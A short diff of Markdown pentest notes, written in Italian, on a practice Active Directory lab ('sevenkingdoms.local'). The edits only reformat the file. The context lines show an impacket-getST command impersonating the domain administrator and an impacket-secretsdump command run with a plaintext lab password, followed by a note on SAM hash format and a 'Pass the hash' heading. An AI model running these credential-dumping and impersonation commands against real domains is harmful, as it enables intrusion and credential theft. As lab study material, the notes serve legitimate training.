@@ -478,7 +478,6 @@ export KRB5CCNAME=./krbrelay\$.ccache
 ```
 ```bash
 impacket-getST -impersonate 'administrator' -spn 'CIFS/castelblack.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$'
-
 ```
 
 ### **Lateral Movement**
@@ -488,7 +487,9 @@ impacket-secretsdump NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
 ```
 ![[Pasted image 20230906162707.png]]
 Per quanto riguarda il SAM i risultato sono mostrati cosi:
+```
 <Username>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:
+```
 Questo valore sulle LM hash significa vuoto "aad3b435b51404eeaad3b435b51404ee"
 
 *Pass the hash*
